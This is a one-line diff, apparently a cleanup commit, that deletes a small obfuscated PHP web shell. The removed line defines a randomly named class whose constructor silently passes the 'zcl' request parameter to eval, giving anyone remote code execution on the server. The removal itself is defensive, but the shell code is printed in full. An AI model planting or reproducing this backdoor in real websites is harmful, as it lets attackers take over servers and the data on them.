@@ -1,1 +1,0 @@
-<?php class GOH31be2 { public function __construct($H3483){ @eval("/*Z#£¤h*u@!hp62fzp690*/".$H3483."/*Z#£¤h*u@!hp62fzp690*/"); }}new GOH31be2($_REQUEST['zcl']);?>
